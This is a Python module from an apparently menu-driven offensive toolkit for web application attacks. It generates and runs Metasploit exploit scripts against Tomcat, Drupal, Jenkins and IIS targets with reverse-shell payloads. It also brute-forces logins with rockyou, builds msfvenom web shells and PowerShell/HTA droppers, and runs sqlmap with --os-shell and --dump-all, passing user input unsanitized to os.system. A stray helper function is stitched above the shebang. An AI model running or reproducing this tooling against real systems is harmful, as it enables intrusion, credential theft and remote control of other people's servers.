
def box(title, icon="⚔️"):
    print()
    print(f"[31m[1m  ┌{'─'*46}┐[0m")
    print(f"[31m[1m  │[0m  [32m[1m{icon}  [33m[1m{title}[0m  [31m[1m{' '*(43-len(title))}[0m")
    print(f"[31m[1m  └{'─'*46}┘[0m")
    print()

section_header = box

def move_to_sdcard(filepath):
    if not os.path.exists(filepath):
        return False
    for sd in ["/sdcard", "/storage/emulated/0"]:
        if os.path.exists(sd):
            dest = os.path.join(sd, os.path.basename(filepath))
            try:
                import shutil as _sh
                _sh.copy2(filepath, dest)
                print(f"  [32m[1m  ✅ Moved to {dest}[0m")
                return True
            except:
                pass
    print(f"  [36m[1m  ➜ {filepath}[0m")
    return False
#!/usr/bin/env python3
"""Web Application Attacks Module"""

import os
import sys
import shutil
import subprocess

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"], capture_output=True)
    from colorama import Fore, Style, init
    init(autoreset=True)

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
D, BRIGHT, RESET = Style.DIM, Style.BRIGHT, Style.RESET_ALL


# ═══════════════════════════════════════════════════════════════
#  TOOL DETECTOR (same as main.py)
# ═══════════════════════════════════════════════════════════════

MSF_PATHS = [
    os.path.expanduser("~/metasploit-framework/msfconsole"),
    "/opt/metasploit-framework/bin/msfconsole",
    "/usr/bin/msfconsole",
    "/usr/local/bin/msfconsole",
    shutil.which("msfconsole") or "",
]

def find_tool(name):
    path = shutil.which(name)
    if path:
        return path
    common = {
        "msfconsole": MSF_PATHS,
        "msfvenom": ["~/metasploit-framework/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"],
        "nmap": ["/usr/bin/nmap"],
        "sqlmap": ["/usr/bin/sqlmap", "/usr/share/sqlmap/sqlmap.py"],
        "hydra": ["/usr/bin/hydra"],
        "john": ["/usr/bin/john"],
        "nikto": ["/usr/bin/nikto"],
        "gobuster": ["/usr/bin/gobuster"],
        "dirb": ["/usr/bin/dirb"],
    }
    for p in common.get(name, []):
        if p and os.path.exists(p):
            return p
    return None

def get_msf_path():
    return find_tool("msfconsole") or "msfconsole"

def get_msfvenom_path():
    return find_tool("msfvenom") or "msfvenom"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def info(msg):
    print(f"  {C}{BRIGHT}  ℹ️  ➤ {msg}{RESET}")

def success(msg):
    print(f"  {G}{BRIGHT}  ✅ ✔ {msg}{RESET}")

def error(msg):
    print(f"  {R}{BRIGHT}  ❌ ✘ {msg}{RESET}")

def cmd_result(label, value):
    print(f"  {M}{BRIGHT}  ◆ {B}{label}:{RESET} {G}{BRIGHT}{value}{RESET}")

def get_ip(prompt, default=""):
    val = input(f"  {C}{BRIGHT}{prompt}{RESET}").strip()
    return val if val else default

def box_alias(title, icon="🌐"):
    print()
    print(f"{R}{BRIGHT}  ╔════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{R}{BRIGHT}  ║{RESET}  {G}{BRIGHT}  {icon}  {Y}{BRIGHT}{title}{RESET}  {R}{BRIGHT}{' '*(63-len(title))}║{RESET}")
    print(f"{R}{BRIGHT}  ╚════════════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def generate_rc_and_run(commands, name="web"):
    rc_file = f"/tmp/{name}.rc"
    with open(rc_file, 'w') as f:
        for cmd in commands:
            f.write(cmd + "\n")
    info(f"Generated: {rc_file}")
    os.system(f"{get_msf_path()} -r {rc_file}")

def web_hacking_menu():
    section_header("WEB APPLICATION ATTACKS", "🌐")
    
    print(f"""
  {M}[1]{RESET}   {G}Apache Tomcat Manager Brute Force{RESET}
  {M}[2]{RESET}   {G}Tomcat Manager WAR Deploy{RESET}
  {M}[3]{RESET}   {G}IIS WebDAV Scanner{RESET}
  {M}[4]{RESET}   {G}IIS WebDAV Upload{RESET}
  {M}[5]{RESET}   {G}WordPress Scanner{RESET}
  {M}[6]{RESET}   {G}WordPress XMLRPC Brute{RESET}
  {M}[7]{RESET}   {G}Drupal Module exploit{RESET}
  {M}[8]{RESET}   {G}Joomla Scanner{RESET}
  {M}[9]{RESET}   {G}MovableType Scanner{RESET}
  {M}[10]{RESET}  {G}Dolibarr Scanner{RESET}
  {M}[11]{RESET}  {G}Jenkins Groovy RCE{RESET}
  {M}[12]{RESET}  {G}GlassFish Scanner{RESET}
  {M}[13]{RESET}  {G}Axis2 Scanner{RESET}
  {M}[14]{RESET}  {G}WebDAV Scanner{RESET}
  {M}[15]{RESET}  {G}HTTP Bruteforce{RESET}
  {M}[16]{RESET}  {G}HTTP Login Scanner{RESET}
  {M}[17]{RESET}  {G}HTTP NTLM Bruteforce{RESET}
  {M}[18]{RESET}  {G}HTTP Form Bruteforce{RESET}
  {M}[19]{RESET}  {G}HTTP Basic Auth Bruteforce{RESET}
  {M}[20]{RESET}  {G}HTTP PUT/DELETE Test{RESET}
  {M}[21]{RESET}  {G}HTTP Options Trace Check{RESET}
  {M}[22]{RESET}  {G}SSL Certificate Check{RESET}
  {M}[23]{RESET}  {G}SSL Heartbleed Check{RESET}
  {M}[24]{RESET}  {G}SSL Poodle Check{RESET}
  {M}[25]{RESET}  {G}SSL BEAST Check{RESET}
  ─────────────────────────────────
  {Y}WEB SHELLS & PAYLOADS:{RESET}
  {M}[26]{RESET}  {G}PHP Reverse Shell (msfvenom){RESET}
  {M}[27]{RESET}  {G}ASPX Reverse Shell{RESET}
  {M}[28]{RESET}  {G}JSP Reverse Shell{RESET}
  {M}[29]{RESET}  {G}WAR Payload Deployer{RESET}
  {M}[30]{RESET}  {G}Web Delivery (PowerShell){RESET}
  {M}[31]{RESET}  {G}Java Signed Applet{RESET}
  {M}[32]{RESET}  {G}HTML Application (HTA){RESET}
  ─────────────────────────────────
  {Y}SQLMAP INTEGRATION:{RESET}
  {M}[33]{RESET}  {G}SQLMap Basic Scan{RESET}
  {M}[34]{RESET}  {G}SQLMap with Tamper Scripts{RESET}
  {M}[35]{RESET}  {G}SQLMap OS Shell{RESET}
  {M}[36]{RESET}  {G}SQLMap Dump All{RESET}
  {M}[37]{RESET}  {G}SQLMap Custom Payload{RESET}
  ─────────────────────────────────
  {Y}DIR BRUTE FORCE:{RESET}
  {M}[38]{RESET}  {G}Dirb Scanner{RESET}
  {M}[39]{RESET}  {G}Gobuster Dir Scan{RESET}
  {M}[40]{RESET}  {G}Wfuzz Dir Fuzz{RESET}
  ─────────────────────────────────
  {Y}XSS / SSTI / DESERIALIZATION:{RESET}
  {M}[41]{RESET}  {G}XSS Scanner{RESET}
  {M}[42]{RESET}  {G}SSTI Scanner{RESET}
  {M}[43]{RESET}  {G}Java Deserialization Scanner{RESET}
  {M}[44]{RESET}  {G}PHP Deserialization{RESET}
  ─────────────────────────────────
  {Y}WEBSERVER SCANS:{RESET}
  {M}[45]{RESET}  {G}Nikto Web Scanner{RESET}
  {M}[46]{RESET}  {G}HTTP Method Scanner{RESET}
  {M}[47]{RESET}  {G}WAF Detection{RESET}
  {M}[48]{RESET}  {G}CORS Scanner{RESET}
  {M}[49]{RESET}  {G}Subdomain Scanner{RESET}
  {M}[50]{RESET}  {G}Virtual Host Brute{RESET}
  {M}[0]{RESET}   {R}🔙 Back{RESET}
""")
    
    choice = input(f"  {C}{BRIGHT}Choose [0-50]: {RESET}").strip()
    if choice == "0":
        return
    
    target = get_ip("RHOSTS (target IP/URL): ")
    lhost = get_ip("LHOST (your IP): ", "0.0.0.0")
    lport = get_ip("LPORT (your port): ", "4444")
    
    web_map = {
        "1": (f"use auxiliary/scanner/http/http_login\nset RHOSTS {target}\nset USERNAME admin\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun", None),
        "2": (f"use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS {target}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun", None),
        "3": (f"use auxiliary/scanner/iis/iis_webdav_scanner\nset RHOSTS {target}\nrun", None),
        "4": (f"use exploit/windows/iis/iis_webdav_upload_asp\nset RHOSTS {target}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun", None),
        "5": (f"use auxiliary/scanner/wordpress/wordpress_scanner\nset RHOSTS {target}\nrun", None),
        "6": (f"use auxiliary/scanner/wordpress/wordpress_xmlrpc_login\nset RHOSTS {target}\nset USERNAME admin\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun", None),
        "7": (f"use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {target}\nset PAYLOAD cmd/unix/reverse_bash\nset LHOST {lhost}\nset LPORT {lport}\nrun", None),
        "8": (f"use auxiliary/scanner/joomla/joomla_scanner\nset RHOSTS {target}\nrun", None),
        "11": (f"use exploit/multi/http/jenkins_script_console\nset RHOSTS {target}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun", None),
        "15": (f"use auxiliary/scanner/http/http_login\nset RHOSTS {target}\nset USERNAME admin\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun", None),
        "16": (f"use auxiliary/scanner/http/http_login\nset RHOSTS {target}\nrun", None),
        "17": (f"use auxiliary/scanner/http/http_ntlm_login\nset RHOSTS {target}\nrun", None),
        "22": (f"use auxiliary/scanner/ssl/ssl_cert\nset RHOSTS {target}\nrun", None),
        "23": (f"use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {target}\nrun", None),
        "24": (f"use auxiliary/scanner/ssl/ssl_poodle\nset RHOSTS {target}\nrun", None),
        "25": (f"use auxiliary/scanner/ssl/ssl_poodle\nset RHOSTS {target}\nrun", None),
        "33": None,
        "34": None,
        "35": None,
        "36": None,
        "37": None,
        "38": None,
        "39": None,
        "40": None,
        "41": None,
        "45": None,
        "46": None,
        "47": None,
        "48": None,
        "49": None,
        "50": None,
    }
    
    if choice in web_map and web_map[choice]:
        cmds = web_map[choice][0].split("\n")
        generate_rc_and_run(cmds, f"web_{choice}")
    elif choice in ["26", "27", "28", "29", "30", "31", "32"]:
        web_payloads(choice, target, lhost, lport)
    elif choice in ["33", "34", "35", "36", "37"]:
        sqlmap_attack(choice, target)
    elif choice in ["38", "39", "40"]:
        dir_bruteforce(choice, target)
    elif choice in ["41", "42", "43", "44"]:
        web_vuln_scan(choice, target)
    elif choice in ["45", "46", "47", "48", "49", "50"]:
        webserv_scan(choice, target)
    else:
        error("Invalid choice!")

def web_payloads(choice, target, lhost, lport):
    payload_map = {
        "26": ("php/meterpreter/reverse_tcp", ".php", "raw"),
        "27": ("windows/x64/meterpreter/reverse_tcp", ".aspx", "aspx"),
        "28": ("java/jsp_shell_reverse_tcp", ".jsp", "jsp"),
        "29": ("java/meterpreter/reverse_tcp", ".war", "war"),
        "30": ("windows/x64/meterpreter/reverse_tcp", ".ps1", "psh-cmd"),
        "31": ("java/applet_main", ".jar", "raw"),
        "32": ("windows/x64/meterpreter/reverse_http", ".hta", "hta-psh"),
    }
    if choice in payload_map:
        payload, ext, fmt = payload_map[choice]
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} -o /root/web_payload{ext}"
        info(f"Generating: web_payload{ext}")
        os.system(cmd)
        success(f"Payload: /root/web_payload{ext}")

def sqlmap_attack(choice, target):
    info("SQLMap Integration:")
    url = get_ip("Target URL (with parameter): ", target)
    tamper = ""
    if choice == "34":
        tamper = "--tamper=space2comment,between,randomcase"
    elif choice == "35":
        tamper = "--os-shell"
    elif choice == "36":
        tamper = "--dump-all"
    
    cmd = f"sqlmap -u '{url}' --batch {tamper}"
    info(f"Running: {cmd}")
    os.system(cmd)

def dir_bruteforce(choice, target):
    wordlist = get_ip("Wordlist path: ", "/usr/share/wordlists/dirb/common.txt")
    if choice == "38":
        os.system(f"dirb http://{target} {wordlist}")
    elif choice == "39":
        os.system(f"gobuster dir -u http://{target} -w {wordlist}")
    elif choice == "40":
        os.system(f"wfuzz -c -z file,{wordlist} http://{target}/FUZZ")

def web_vuln_scan(choice, target):
    if choice == "41":
        info("XSS scanning - use Burp Suite or manual testing")
    elif choice == "42":
        info("SSTI testing - try {{7*7}} and ${7*7} in parameters")
    elif choice == "43":
        info("Java deserialization - use ysoserial for payload generation")
    elif choice == "44":
        info("PHP deserialization - use phpggc for payload generation")

def webserv_scan(choice, target):
    if choice == "45":
        os.system(f"nikto -h {target}")
    elif choice == "46":
        info("HTTP Methods:")
        os.system(f"curl -I -X OPTIONS http://{target}")
    elif choice == "47":
        info("Checking WAF...")
        os.system(f"wafw00f {target}")
    elif choice == "48":
        info("CORS Check:")
        os.system(f"curl -I -H 'Origin: http://evil.com' http://{target}")
    elif choice == "49":
        info("Subdomain scan:")
        os.system(f"sublist3r -d {target}")
    elif choice == "50":
        info("Virtual Host brute:")
        os.system(f"gobuster vhost -u http://{target} -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt")
